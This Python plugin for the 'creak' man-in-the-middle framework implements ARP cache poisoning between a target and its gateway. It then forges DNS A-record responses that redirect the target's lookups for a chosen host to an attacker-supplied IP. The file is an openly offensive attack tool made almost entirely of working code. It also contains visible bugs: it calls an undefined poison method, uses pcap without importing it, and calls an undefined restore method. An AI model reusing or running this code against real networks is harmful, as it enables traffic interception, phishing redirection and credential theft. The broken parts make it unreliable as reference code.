#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import time
from threading import Thread
from socket import socket, gethostbyname, inet_ntoa, PF_PACKET, SOCK_RAW
import dpkt
import dnet
from creak.baseplugin import BasePlugin
import creak.utils as utils
import creak.config as config

(G, W, R) = (utils.G, utils.W, utils.R)

class Plugin(BasePlugin):

    """
    """

    def init_plugin(self):
        self._set_info(
            author='codep',
            version='1.0',
            description='Intercept traffic on a subnet and spoof DNS responses in order to redirect target(s)')
        self._set_required_params(dev=True, target=True, gateway=True, src_mac=False, delay=False, stop=False, redirection=False, host=False)
        self._set_root(True)

    def _build_pcap_filter(self, prefix, port=None):
        """ build the pcap filter based on arguments self.target and port"""
        pcap_filter = prefix
        if isinstance(self.target, list):
            pcap_filter = "(%s " % pcap_filter
            for addr in self.target[:-1]:
                pcap_filter += "%s or " % addr
            pcap_filter += "%s) " % self.target[-1]
        else:
            pcap_filter += "%s" % self.target
        if port:
            pcap_filter += " and tcp port %s" % port

        return pcap_filter

    def _poison(self, dev, src_mac, gateway, target, delay, stop):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while not stop():
                if config.VERBOSE:
                    self.print_output('%s <-- %s -- %s -- %s --> %s',
                                      gateway, target, dev, gateway, target)
                    if not isinstance(target, list):
                        sock.send(str(utils.build_arp_packet(
                            src_mac, gateway, target)))
                        sock.send(str(utils.build_arp_packet(
                            src_mac, target, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
                    else:
                        for addr in target:
                            sock.send(str(utils.build_arp_packet(src_mac, gateway, addr)))
                            sock.send(str(utils.build_arp_packet(src_mac, addr, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
            sock.close()
        except KeyboardInterrupt:
            self.print_output('\n\rPoisoning interrupted')
            sock.close()

    def run(self, kwargs):
        """
        Redirect all incoming request for 'host' to 'redirection'
        """
        stop = False
        pcap_filter = self._build_pcap_filter('udp dst port 53 and src ')
        redirection = gethostbyname(kwargs['redirection'])
        sock = dnet.ip()
        source = kwargs['src_mac'] if hasattr(kwargs, 'src_mac') else utils.get_default_gateway_linux()
        self.print_output('Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
                          + ' and ' + R
                          + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self.poison,
                               args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2, lambda: stop))
        poison_thread.daemon = True
        poison_thread.start()

        packets = pcap.pcap(self.dev)
        packets.setfilter(pcap_filter)

        self.print_output('Redirecting ' + G + kwargs['host'] + W + ' to ' + G + redirection + W + ' for ' + R
                          + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W)

        try:
            for _, pkt in packets:
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                udp = ip_packet.data
                dns = dpkt.dns.DNS(udp.data)
                # validate query
                if dns.qr != dpkt.dns.DNS_Q:
                    continue
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    continue
                if len(dns.qd) != 1:
                    continue
                if len(dns.an) != 0:
                    continue
                if len(dns.ns) != 0:
                    continue
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    continue
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    continue
                # spoof for our target name
                if dns.qd[0].name != kwargs['host']:
                    continue

                # dns query->response
                dns.op = dpkt.dns.DNS_RA
                dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                dns.qr = dpkt.dns.DNS_R

                # construct fake answer
                arr = dpkt.dns.DNS.RR()
                arr.cls, arr.type, arr.name = dpkt.dns.DNS_IN, dpkt.dns.DNS_A, kwargs['host']
                arr.ip = dnet.addr(redirection).ip

                dns.an.append(arr)

                udp.sport, udp.dport = udp.dport, udp.sport
                ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                udp.data, udp.ulen = dns, len(udp)
                ip_packet.len = len(ip_packet)

                print(inet_ntoa(ip_packet.src))

                buf = dnet.ip_checksum(str(ip_packet))
                sock.send(buf)

        except KeyboardInterrupt:
            self.print_output('DNS spoofing interrupted\n\r')
            self.restore(2)
            utils.set_ip_forward(0)
